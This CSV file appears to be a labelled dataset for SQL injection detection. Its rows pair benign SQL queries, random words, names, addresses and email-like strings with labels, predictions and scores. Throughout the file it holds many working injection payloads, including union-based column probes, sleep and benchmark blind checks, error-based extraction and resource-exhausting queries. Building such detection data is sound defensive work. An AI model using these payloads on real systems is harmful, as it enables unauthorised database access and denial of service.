"  select pony as vessels, dig as [matter]  from anyway",0,0,0.0
" end and   (  ""xksk""  =  ""xksk",1,1,1.0
princep muntadas,0,0,0.004468253314358248
select top 50 percent * from remarkable select * from ten fetch first 50 percent rows onlyselect top 3 * from those,0,0,0.0
1  )   as ozga where 4002  =  4002 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,1,1.0
46725,0,0,0.004468253314358248
select * from course where sink between '1996-07-01' and '1996-07-31',0,0,0.0
select * from ate,0,0,0.0
select * from history fetch first 50 percent rows onlyselect top 3 * from seldom,0,0,0.0
"1"" where 5353  =  5353 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,1,1.0
select count ( * )  as practice,0,0,0.0
"1'  )   as mgko where 1828  =  1828 and make_set  (  8403  =  8403,8899  )  --",1,1,1.0
"calle goya 46, 10?g",0,0,0.0
nort$ea,0,0,0.004468253314358248
select * from finally where than like '%describe%',0,0,0.0
o1e6e2d6,0,0,0.004468253314358248
select * from earth where mysterious not between 'done' and 'donkey',0,0,0.0
9849,0,0,0.004468253314358248
"-4707' union all select 4414,4414,4414,4414,4414,4414#",1,1,1.0
select avg ( eleven )  from seed  select sum ( nodded ) ,0,0,0.0
select avg ( pour ) from choose select sum ( within ) ,0,0,0.0
"silo 179, 12?b",0,0,8.698919962957339e-05
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'hmqd'  =  'hmqd",1,1,1.0
"   select count ( useful ) , express from merely by tobacco",0,0,0.0
-7999  )   or 8422  =  1336,1,1,1.0
"1""  )   and sleep  (  5  )  #",1,1,1.0
"1' in boolean mode  )   union all select null,null#",1,1,1.0
"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--",1,1,1.0
colunga corrius,0,0,0.004468253314358248
villanueva gualano,0,0,0.004468253314358248
select * from settlers where prize not like '[glass]%',0,0,0.0
"insert into wool ( vapor, frog, ranch, nodded, war, angry )  values  ( 'mother', 'yourself'. thy', 'call', 'depend', 'thou', 'particles' )  ",0,0,0.0
7770,0,0,0.004468253314358248
"1'  )   as myxr where 6299  =  6299 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
select weekday ( curdate (   )  )  ;,0,0,0.0
select   (  case when   (  9746  =  8055  )   then 9746 else 1/  (  select 0  )   end  )  --,1,1,1.0
"1   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  6578  =  6578",1,1,1.0
"1""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""ngnd"" like ""ngnd",1,1,1.0
"   select mental, against, piefrom require where trail  is not null",0,0,0.0
select negative ( s )  from various,0,0,0.0
"1%' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and '%'  =  '",1,1,1.0
"1""  )   and 2954  =  1256--",1,1,1.0
select * from operation  where lesson not like '[rule]%',0,0,0.0
1' where 9024  =  9024 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1,1,1.0
sandberg@3horas.tl,0,0,0.004468253314358248
"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,1,1.0
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1,1,0.99
"select monthname ( ""2017-06-15 09:34:21"" ) ;",0,0,0.0
"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",1,1,1.0
select television ( s )  from bill select transportation ( s ) ,0,0,0.0
1'+  (  select 'tjvt' where 2463  =  2463,1,1,1.0
"   select count ( many ) , star from truth by reach",0,0,0.0
delete from kept where want = 'softly',0,0,0.0
"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""knbx""  =  ""knbx",1,1,1.0
"1""   )    )     )   and 4595  =  4595#",1,1,1.0
"   select count ( piece ) , but from add by main",0,0,0.0
select * from gulf where stream in  ( select flame from got ) ,0,0,0.0
select count ( tightid ) from noted,0,0,0.0
"   select busy, invented, chief from view where tool  is null",0,0,0.0
castejn de tornos,0,0,0.0
select avg ( price ) from truck,0,0,0.0
1'   )    )    and   (  7517  =  3423  )  *3423 and    (    (   'aenz'  =  'aenz,1,1,1.0
nanjar viejo,0,0,0.004468253314358248
"-9622' union all select 7208,7208,7208,7208#",1,1,1.0
select above from palace,0,0,0.0
ojinaga bascn,0,0,0.004468253314358248
"   select muscle,thought,pay,depend,replied     (  (  forty join pencil on picture.club =  worried.shelter )   inner join adjectiveon orders.every =  how.averageid ) ",0,0,0.0
" select * from lovely order by practice, ship",0,0,0.0
"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lano""  =  ""lano",1,1,1.0
"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,1,1.0
"alter table zcf_zohocrmform_field_manager modify module_type varchar ( 255 ) ,modify base_model varchar ( 255 ) ,modify field_label varchar ( 255 ) ,modify field_name varchar ( 255 ) ",0,1,0.9501059740600861
intxaurraga,0,0,0.004468253314358248
1'+  (  select 'zugq' where 9218  =  9218,1,1,1.0
correccionalmente,0,0,0.004468253314358248
"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""gmld"" like ""gmld",1,1,1.0
select min ( cannot )  as herd from drew,0,0,0.0
select * from  ( select leather from drive ) ,0,0,0.0
"1%'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
winningt,0,0,0.004468253314358248
novallas,0,0,0.004468253314358248
select * from sight order by advice desc,0,0,0.0
1' where 5230  =  5230,1,1,1.0
"1'+  (  select 'jfir' where 7814  =  7814 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1,1,1.0
"1%'   )    )     )   union all select null,null,null#",1,1,1.0
"1  )   where 8691  =  8691 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
select * from origin where bridge = 'sport',0,0,0.0
6o40o41,0,0,0.004468253314358248
"1   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  9462  =  9462",1,1,1.0
narita@deportechino.an,0,0,0.004468253314358248
"select pg_sleep  (  5  )   and   (  ""tpry""  =  ""tpry",1,1,0.98
select * from look where chair = 'grain'  or park = 'himself',0,0,0.0
"1""   )    )    as ecnn where 8913  =  8913 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
pompa,0,0,0.004468253314358248
"-7482%""   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,1,1,1.0
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'ozur'  =  'ozur",1,1,1.0
1 where 7254  =  7254,1,1,1.0
select * from swam where pencil between 'rays' and 'according',0,0,0.0
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'napi' like 'napi,1,1,1.0
select * from attention fetch first 50 percent rows onlyselect top 3 * from hay,0,0,0.0
"-3834'   )    )     )   union all select 8313,8313--",1,1,1.0
"1""  )   as ybkp where 7788  =  7788 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,1,1.0
select * from essential fetch first 50 percent rows onlyselect top 3 * from horse,0,0,0.0
mike-osbourne@hiperzaragoza.qa,0,0,0.006527024015406931
"select * from forward where gravity between ""highway"" and    ""happened""",0,0,0.0
"1""   )    )     )   union all select null,null,null,null,null--",1,1,1.0
"select suppliername, contactname, address, city, postalcode, country from suppliers; insert into customers  ( customername, city, country )  ",0,0,2.49635947576451e-05
"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,1.0
" select count ( customerid ) , country from customers group by country  having count ( customerid )  > 5;",0,0,0.13
1'  )   or sleep  (  5  )   and   (  'kgbm'  =  'kgbm,1,1,1.0
cousinea,0,0,0.004468253314358248
"  update driven set become =  'given', city =  'whispered' where silence =  pool",0,0,0.0
24892,0,0,0.004468253314358248
"1'   )    )    as ytfi where 3323  =  3323 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
8.5138e+15,0,0,0.0
select * from neighbor where green not like 'important%',0,0,0.0
vigoda5@fotoseroticas.com.ae,0,0,0.0
"-2718"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""xwbf""  =  ""xwbf",1,1,1.0
vadell comalada,0,0,0.004468253314358248
2759,0,0,0.004468253314358248
1'  )   union all select null#,1,1,0.99
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  7946  =  7946",1,1,0.99
select * from perfectly where describe = 'fairly' fetch first 3 rows only,0,0,0.0
18121520g,0,0,0.004468253314358248
37219,0,0,0.004468253314358248
"-5597'  )   or make_set  (  2490  =  2164,2164  )  ",1,1,0.99
select * from soil where among like '%join%',0,0,0.0
select * from wp_posts where id  =  367808 limit 1,0,0,0.0
"1%'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  '%'  =  '",1,1,1.0
"-7248'  )   where 4626  =  4626 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
select * from sold order by hot,0,0,0.0
"1""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1,1.0
select top 50 percent * from somewhere,0,0,0.0
select not ( s )  from greatest union,0,0,0.0
"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,1,1.0
"quinita flores 75,",0,0,0.0012045813123877282
baumgarten bagudanc,0,0,0.004468253314358248
aliaguilla,0,0,0.004468253314358248
select * from  ( select youth from few ) ,0,0,0.0
select whale ( s )  from join left join,0,0,0.0
select * from perfectly where canal = 'sum'  and city = 'belt',0,0,0.0
"1%' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  '",1,1,1.0
"-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--",1,1,1.0
c09so18,0,0,0.004468253314358248
qui0g6n16si2o,0,0,0.004468253314358248
sugesto,0,0,0.004468253314358248
select * from nation where job = 'roll' limit 3,0,0,0.0
select top 3 * from airplane where president = 'hollow' select * from tube,0,0,0.0
wolbert.navin@cirugiaalbeiteria.nu,0,0,0.004468253314358248
"  select grandfatherid as id, friend as edge from fact",0,0,0.0
" select * from putting order by thought, nice",0,0,0.0
select in ( s )  from missing select deer from written,0,0,0.05
select * from truck where chair = 'maybe',0,0,0.0
"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'yzdp'  =  'yzdp",1,1,1.0
select distinct chicken from traffic,0,0,0.0
select top 50 percent * from yesterday,0,0,0.0
"  select orders.keyrid, employees.smile, employees.managed from ordersright join employees on orders.employeeid  =  employees.bridgeid order by orders.airplaneid",0,0,0.0
1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,1,1,0.99
select count ( distinct national )  from good,0,0,0.0
5.9335e+15,0,0,0.0
"1'  )   where 6248  =  6248 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,1.0
"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",1,1,1.0
"  select * from garage where exactly in  ( 'above', 'shut', 'becoming' )  ",0,0,0.0
"1%"" union all select null,null,null,null,null,null,null,null#",1,1,1.0
"  select * from sharp where bigger not in  ( 'since', 'likely', 'through' )  ",0,0,0.0
select * from troops fetch first 50 percent rows only,0,0,0.0
 or 0  =  0 #,1,1,0.9308333333333334
select avg ( price ) from until,0,0,0.0
1'  )   where 5280  =  5280 and 4595  =  4595#,1,1,1.0
delete from push,0,0,0.0
select avg ( price ) from recognize,0,0,0.0
select * from most,0,0,0.0
38470,0,0,0.004468253314358248
select * from believed where impossible = 'pictured'  and city = 'fair',0,0,0.0
"-7041""   )    )     )   union all select 2159,2159,2159,2159,2159--",1,1,1.0
72484997z,0,0,0.004468253314358248
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""fkdx"" like ""fkdx",1,1,1.0
select go ( s )  from remarkable,0,0,0.0
ars yermo,0,0,0.004468253314358248
"1' in boolean mode  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  #",1,1,1.0
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,1.0
"1""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""ieuj"" like ""ieuj",1,1,1.0
1 where 8506  =  8506,1,1,1.0
-8131'   )    )    or 9680  =  3467,1,1,1.0
select peace ( s )  from aware union all,0,0,0.0
select every from directly union all select merely from indeed order by furniture,0,0,0.0
giuliani casabella,0,0,0.004468253314358248
8.76216e+15,0,0,0.0
select avg ( greater ) from weight select sum ( atom ) ,0,0,0.0
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,1,1.0
israel_piggot@joyclub.pe,0,0,0.004468253314358248
select * from double where apartment = 'invented',0,0,0.0
select count ( distinct needed )  from barn,0,0,0.0
netty9,0,0,0.004468253314358248
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'efpc' like 'efpc",1,1,1.0
"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",1,1,1.0
73034797e,0,0,0.004468253314358248
"-9508  )   union all select 9950,9950,9950,9950,9950,9950,9950#",1,1,1.0
select * from continent fetch first 3 rows only,0,0,0.0
"1   )    )    union all select null,null,null,null,null,null,null,null--",1,1,1.0
"1%"" and 4595  =  4595#",1,1,1.0
select * from down where price not between 10 and 20,0,0,0.0
select count ( height ) from studying,0,0,0.0
select * from suggest fetch first 3 rows only select top 50 percent * from porch,0,0,0.0
select * from east where tightly = 'lady' fetch first 3 rows only,0,0,0.0
"gredos, 114 12?g",0,0,4.7826991058432104e-05
select * from clear where exciting not like '[slept]%',0,0,0.0
1 where 9752  =  9752,1,1,1.0
"1'  )   as sjmt where 6541  =  6541 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
" select * from station order by bark, won",0,0,0.0
"mirn, el",0,0,0.0
"1""   )    )    as krro where 1050  =  1050 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,1,1.0
"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""fbol"" like ""fbol",1,1,1.0
select * from who order by climate,0,0,0.0
select * from naturally where nearby between provide09/01/1996trail and symbol15/31/1996voyage,0,0,0.0
8.366e+15,0,0,0.0
"1'+  (  select 'zirh' where 9054  =  9054 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  +'",1,1,1.0
"c/ pozo seco 37, 6-d",0,0,0.0
delete from wooden,0,0,0.0
"1'   )    )    as kwre where 7775  =  7775 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
lewes,0,0,0.004468253314358248
select avg ( load ) from mountain select sum ( write ) ,0,0,0.0
46881104c,0,0,0.004468253314358248
"1' in boolean mode  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #",1,1,1.0
76156835v,0,0,0.004468253314358248
select top 50 percent * from arm,0,0,0.0
"1',  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )   ",1,1,1.0
"   select magic, replace, shoulder from hurt where fierce  is null",0,0,0.0
end and    (    (   'vcaf' like 'vcaf,1,1,1.0
"1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'vtno'  =  'vtno",1,1,1.0
1'  )   where 5145  =  5145,1,1,1.0
"1 where 6169  =  6169   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,1,1.0
select improve ( s )  from cave,0,0,0.0
select * from dirt where leg = 'sight',0,0,0.0
grant connect to name; grant resource to name;,1,0,0.2
"  select * from for where silence not in  ( 'rise', 'roar', 'one' )  ",0,0,0.0
"-4068'   )    )     )   union all select 9491,9491,9491--",1,1,1.0
"antelo y mario, 192,",0,0,0.004468253314358248
herminia,0,0,0.004468253314358248
1'  )   where 5680  =  5680 and   (  3020  =  3020  )  *6703--,1,1,1.0
select * from chapter where nothing = 'time',0,0,0.0
"calle perez galdos 193,",0,0,0.0
lewwis.mall@epbx.pg,0,0,0.004468253314358248
select top 50 percent * from supper,0,0,0.0
cabot camaran,0,0,0.004468253314358248
select count ( symbol ) from planned,0,0,0.0
select * from completely where we not like '[carry]%',0,0,0.0
select factory ( s )  from cell union,0,0,0.0
select avg ( long ) from heavy select sum ( bright ) ,0,0,0.0
"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'vpus'  =  'vpus",1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 28557 )  order by meta_id asc",0,0,0.0
"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",1,1,1.0
select * from proud where price = 'luck' limit 3,0,0,0.0
"1""   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1,1,1.0
gwenda,0,0,0.004468253314358248
nrez muriscot,0,0,0.004468253314358248
"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",1,1,1.0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  9646  =  9646",1,1,1.0
select * from movie where physical = 'man'  and city = 'leather',0,0,0.0
select straw from valley union select world from snow order by represent,0,0,0.0
8855,0,0,0.004468253314358248
"1""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""rvub"" like ""rvub",1,1,1.0
"   select trap,chosen,eventually,journey,job     (  (  build join grandmother on satisfied.salt =  studied.eventually )   inner join perfecton orders.coast =  whom.gentleid ) ",0,0,0.0
"1',  (  select   (  case when   (  6750  =  6750  )   then 1 else 6750*  (  select 6750 from information_schema.character_sets  )   end   )    )   ",1,1,1.0
select * from city fetch first 50 percent rows only,0,0,0.0
"  select pet,buried from ride where anyone = 'wonder' union select leaf, interest from bridge",0,0,0.0
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'iuki'  =  'iuki,1,1,1.0
"   select count ( run ) , conversation from open by shoe",0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 173 )  order by meta_id asc",0,0,0.0
50835477a,0,0,0.004468253314358248
"1'   )    )    as gqzy where 2312  =  2312 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
"1'  )   as noqp where 4042  =  4042 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
thibaut,0,0,0.004468253314358248
48263928s,0,0,0.004468253314358248
select * from stuck where related = 'serious'  and city = 'former',0,0,0.0
"  select tried,accurate,stared from fellow left join orders on lose.happenid =  broke.list order by tribe.husband",0,0,0.0
select cannot from half union select curve from very order by machinery,0,0,0.0
6.98863e+15,0,0,0.0
select top 3 * from just where doll = 'adventure' select * from try,0,0,0.0
"-5062""   )    )     )   union all select 4125,4125--",1,1,1.0
select globe ( s )  from shirt union all,0,0,0.0
"1' or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,1.0
sobrino coyoma,0,0,0.004468253314358248
"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",1,1,1.0
cooperma,0,0,0.004468253314358248
1' where 8945  =  8945 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,1,1.0
calle nicolas funes 116,0,0,0.0
"-8940""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""vnuo"" like ""vnuo",1,1,1.0
3596,0,0,0.004468253314358248
"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",1,1,1.0
select * from tool where    not news = 'related',0,0,0.0
select * from drive where cattle like '%fly%',0,0,0.0
1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,1,1,1.0
4270,0,0,0.004468253314358248
select avg ( direction ) from television select sum ( last ) ,0,0,0.0
select * from father where related between have09/01/1996or and seed15/31/1996chicken,0,0,0.0
9.90463e+15,0,0,0.0
select middle ( s )  from promised select tribe ( s ) ,0,0,0.0
"  select redid as id, let as automobile from seeing",0,0,0.0
"  select ballid as id, table as fallen from frighten",0,0,0.0
select * from back where real = 'major' fetch first 3 rows only,0,0,0.0
712,0,0,0.004468253314358248
"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'skdy'  =  'skdy",1,1,1.0
"  select out as fence, good as [quietly]  from who",0,0,0.0
41100,0,0,0.004468253314358248
select * from negative fetch first 3 rows only,0,0,0.0
"1%""   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
select   (  case when   (  7169  =  7785  )   then 1 else 7169*  (  select 7169 from master..sysdatabases  )   end  )  --,1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 13610 )  order by meta_id asc",0,0,0.0
select * from affect,0,0,0.0
steinfeld@multireform.sg,0,0,0.004468253314358248
"-6662""   )    )    union all select 6755--",1,1,1.0
8693,0,0,0.004468253314358248
" select column_name ( s )  from no,former",0,0,0.0
24768,0,0,0.004468253314358248
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,1.0
"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5f6c9a3c611fd' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",0,0,0.0
"-4905"" union all select 6082,6082--",1,1,1.0
mangot barra,0,0,0.004468253314358248
22373,0,0,0.004468253314358248
select * from planned fetch first 50 percent rows only,0,0,0.0
"de l' aliga 3,",0,0,0.08
select sleep  (  5  )   and    (    (   '%'  =  ',1,1,1.0
"   select grade, reason, automobilefrom no where obtain  is not null",0,0,0.0
62128531b,0,0,0.004468253314358248
bnrinfo,0,0,0.004468253314358248
"-3249'   )    )     )   union all select 6309,6309#",1,1,1.0
"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",1,1,1.0
select avg ( layers ) from lady select sum ( writing ) ,0,0,0.0
delmo,0,0,0.004468253314358248
atuesta venturi,0,0,0.004468253314358248
9ar5i04o,0,0,0.004468253314358248
select * from users where id  =  '1' or \<1 or 1  =  1 -- 1',1,1,1.0
"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,1,1.0
select min ( green )  as eager from crowd,0,0,0.0
7.13661e+15,0,0,0.0
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ctac' like 'ctac",1,1,1.0
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",1,1,1.0
"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""sajl""  =  ""sajl",1,1,1.0
select avg ( favorite ) from softly,0,0,0.0
select top 50 percent * from badly select * from thee fetch first 50 percent rows onlyselect top 3 * from leave,0,0,0.0
select * from glass  where sat = blanket,0,0,0.0
leuco vilca,0,0,0.004468253314358248
buitrago pontigo,0,0,0.004468253314358248
1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1,1.0
1' where 9602  =  9602,1,1,1.0
"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",1,1,1.0
d'amico urrea,0,0,0.0401973015889566
"1'   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1,1,1.0
husky_hurlic@ropadegolf.sn,0,0,0.003983800240513096
select * from twenty where wrote between '1996-07-01' and '1996-07-31',0,0,0.0
